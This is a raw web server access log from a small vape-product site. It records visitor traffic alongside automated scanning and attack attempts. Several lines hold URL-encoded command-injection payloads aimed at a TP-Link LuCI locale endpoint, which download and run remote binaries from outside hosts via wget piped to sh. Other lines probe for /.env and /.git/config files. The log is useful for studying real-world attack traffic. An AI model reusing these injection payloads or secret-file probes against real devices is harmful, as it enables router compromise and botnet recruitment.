37.201.160.212 - - [15/May/2024:10:42:03 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET / HTTP/1.1" 200 1211 "http://93.231.130.227/marke_add" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 344 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 139392 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 343 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [17/May/2024:13:51:18 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 139392 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
8.217.102.26 - - [17/May/2024:13:51:18 +0200] "GET / HTTP/1.1" 200 1052 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"
8.217.102.26 - - [17/May/2024:13:51:48 +0200] "GET /favicon.ico HTTP/1.1" 404 363 "-" "curl/7.75.0"
31.220.1.83 - - [17/May/2024:14:02:49 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
194.169.175.19 - - [17/May/2024:14:25:58 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.38.111 - - [17/May/2024:14:31:58 +0200] "GET / HTTP/1.1" 200 4476 "-" "-"
190.2.147.33 - - [17/May/2024:14:33:48 +0200] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
31.220.1.83 - - [17/May/2024:14:54:38 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
65.49.1.25 - - [17/May/2024:15:14:54 +0200] "GET / HTTP/1.1" 200 1052 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
65.49.1.26 - - [17/May/2024:15:17:22 +0200] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
65.49.1.34 - - [17/May/2024:15:17:58 +0200] "GET /geoserver/web/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
179.43.188.106 - - [17/May/2024:15:32:36 +0200] "GET / HTTP/1.1" 200 4476 "-" "-"
87.121.69.52 - - [17/May/2024:15:47:20 +0200] "CONNECT google.com:443 HTTP/1.1" 405 345 "-" "Go-http-client/1.1"
138.197.176.42 - - [17/May/2024:15:51:51 +0200] "\x16\x03\x01" 400 488 "-" "-"
138.197.176.42 - - [17/May/2024:15:51:51 +0200] "GET / HTTP/1.1" 200 1052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
185.224.128.43 - - [17/May/2024:16:09:18 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [17/May/2024:16:35:37 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
205.210.31.106 - - [17/May/2024:16:47:10 +0200] "GET / HTTP/1.1" 200 4476 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.191.126.213 - - [17/May/2024:17:38:49 +0200] "GET / HTTP/1.1" 200 4476 "-" "-"
31.220.1.83 - - [17/May/2024:17:45:53 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
183.81.169.139 - - [17/May/2024:17:57:13 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
94.156.68.198 - - [17/May/2024:18:11:54 +0200] "GET /.git/config HTTP/1.1" 404 382 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1"
94.156.68.198 - - [17/May/2024:18:11:55 +0200] "GET /.git/config HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
46.174.191.30 - - [17/May/2024:18:25:03 +0200] "GET / HTTP/1.0" 200 4495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /uploads/111_ters_vozol.png HTTP/1.1" 304 183 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 304 183 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /uploads/10_blueberry_cranberry_cherry_savage.png HTTP/1.1" 304 183 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:04 +0200] "GET /uploads/111_test_savage.png HTTP/1.1" 304 182 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:30 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:30 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:39:30 +0200] "GET /static/styles/base.css HTTP/1.1" 200 693 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET / HTTP/1.1" 200 1108 "android-app://com.google.android.googlequicksearchbox/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 200 154583 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /uploads/111_test_savage.png HTTP/1.1" 200 286680 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /uploads/111_ters_vozol.png HTTP/1.1" 200 289350 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /uploads/10_blueberry_cranberry_cherry_savage.png HTTP/1.1" 200 289350 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:05 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:26 +0200] "GET / HTTP/1.1" 200 1108 "android-app://com.google.android.googlequicksearchbox/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:26 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:26 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 344 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:26 +0200] "GET /static/styles/base.css HTTP/1.1" 200 693 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
176.1.20.124 - - [17/May/2024:18:40:26 +0200] "GET /uploads/1_gummipenis_vozol.mov HTTP/1.1" 206 110880 "http://93.231.130.227/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
109.43.240.225 - - [17/May/2024:18:40:34 +0200] "GET /login HTTP/1.1" 200 911 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:34 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:34 +0200] "GET /static/styles/login.css HTTP/1.1" 200 495 "http://93.231.130.227/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:40 +0200] "POST /login HTTP/1.1" 302 970 "http://93.231.130.227/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:40 +0200] "GET / HTTP/1.1" 200 1597 "http://93.231.130.227/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:40 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:40 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:44 +0200] "GET / HTTP/1.1" 200 1211 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:44 +0200] "GET /static/styles/base.css HTTP/1.1" 200 693 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:44 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:44 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:44 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:45 +0200] "GET /uploadfile HTTP/1.1" 200 1231 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:45 +0200] "GET /static/styles/upload.css HTTP/1.1" 200 563 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:45 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:46 +0200] "GET /delete_vape HTTP/1.1" 500 466 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:50 +0200] "GET /marke_add HTTP/1.1" 200 1164 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:50 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/marke_add" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:50 +0200] "GET /static/styles/marke_add.css HTTP/1.1" 200 565 "http://93.231.130.227/marke_add" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:51 +0200] "GET /delete_vape HTTP/1.1" 500 466 "http://93.231.130.227/marke_add" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:53 +0200] "GET /uploadfile HTTP/1.1" 200 1232 "http://93.231.130.227/marke_add" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:53 +0200] "GET /static/styles/upload.css HTTP/1.1" 200 564 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:53 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:40:53 +0200] "GET /static/styles/upload.css HTTP/1.1" 200 564 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:41:01 +0200] "GET / HTTP/1.1" 200 1211 "http://93.231.130.227/uploadfile" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:41:01 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:41:01 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:41:01 +0200] "GET /static/styles/base.css HTTP/1.1" 200 693 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
109.43.240.225 - - [17/May/2024:18:41:01 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
51.158.205.47 - - [17/May/2024:18:41:43 +0200] "GET / HTTP/1.0" 200 4495 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
162.243.142.52 - - [17/May/2024:18:42:45 +0200] "MGLNDD_93.231.130.227_80\n" 400 488 "-" "-"
31.220.1.83 - - [17/May/2024:19:19:36 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
185.242.226.99 - - [17/May/2024:19:24:40 +0200] "GET / HTTP/1.1" 200 1052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
183.81.169.139 - - [17/May/2024:20:07:08 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
185.224.128.43 - - [17/May/2024:20:20:58 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [17/May/2024:20:47:35 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
162.243.142.35 - - [17/May/2024:20:56:03 +0200] "GET / HTTP/1.1" 200 1052 "-" "Mozilla/5.0 zgrab/0.x"
31.220.1.83 - - [17/May/2024:21:49:29 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
87.121.69.52 - - [17/May/2024:21:58:02 +0200] "CONNECT google.com:443 HTTP/1.1" 405 345 "-" "Go-http-client/1.1"
141.98.11.79 - - [17/May/2024:22:33:34 +0200] "CONNECT google.com:443 HTTP/1.1" 405 345 "-" "Go-http-client/1.1"
185.191.126.213 - - [17/May/2024:22:37:53 +0200] "GET / HTTP/1.1" 200 4476 "-" "-"
183.81.169.139 - - [17/May/2024:22:41:11 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
194.169.175.19 - - [17/May/2024:22:46:45 +0200] "GET / HTTP/1.1" 200 1108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.170.144.3 - - [17/May/2024:23:49:59 +0200] "\x03" 400 488 "-" "-"
87.236.176.68 - - [18/May/2024:00:07:02 +0200] "GET / HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
183.81.169.139 - - [18/May/2024:00:30:13 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
147.78.103.162 - - [18/May/2024:00:47:41 +0200] "GET / HTTP/1.1" 400 488 "-" "-"
